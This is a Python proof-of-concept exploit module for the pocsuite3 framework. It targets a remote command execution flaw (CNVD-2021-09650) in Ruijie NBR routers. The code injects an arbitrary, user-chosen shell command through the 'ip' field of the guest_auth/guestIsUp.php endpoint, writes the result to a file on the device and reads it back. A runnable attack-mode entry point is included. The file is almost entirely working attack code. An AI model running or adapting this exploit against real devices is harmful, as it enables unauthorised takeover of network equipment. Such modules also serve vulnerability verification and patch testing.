import string
from pocsuite3.api import register_poc, POCBase, logger, requests
from urllib.parse import urljoin
import random
from collections import OrderedDict
from pocsuite3.lib.core.interpreter_option import OptString


class Exploit(POCBase):
    cnvd = "CNVD-2021-09650"
    name = "锐捷NBR路由器远程命令执行"
    vulDate = "2023-02-24"
    appName = "Ruijie"
    vulType = "Remote Code Execute"
    OPTIONS = OrderedDict({"command": OptString('id', "自定义执行指令")})

    def _attack(self):
        s = requests.session()
        file_name = ''.join(random.sample(string.ascii_letters + string.digits, 5))
        target_url = urljoin(self.url, '/guest_auth/guestIsUp.php')
        result_url = urljoin(self.url, f'/guest_auth/{file_name}.txt')
        command = self.get_option('command')
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = f"mac=1&ip=127.0.0.1| {command} > {file_name}.txt"
        res = s.get(target_url, verify=False, timeout=8)
        if res.status_code == 200:
            res1 = s.post(target_url, headers=headers, data=data, verify=False, timeout=8)
            if res1.status_code == 200:
                logger.debug('Command exec Success!')
                res2 = s.get(result_url, verify=False, timeout=8)
                if res2.status_code == 200 and 'uid' in res2.text:
                    return self.parse_output({'VerifyInfo': {command: res2.text}})
            else:
                logger.debug('Command exec filed!')
        else:
            logger.debug(f"{self.url} is not vul!")


register_poc(Exploit)

if __name__ == '__main__':
    import os

    os.environ.setdefault('http', 'http://127.0.0.1:7890')
    os.environ.setdefault('http', 'http://127.0.0.1:7890')
    exp = Exploit()
    logger.setLevel(level='DEBUG')
    exp.set_option("url", "https://127.0.0.1:4430")
    exp.set_option('command', 'id')
    exp.execute(mode='attack', debug=True)
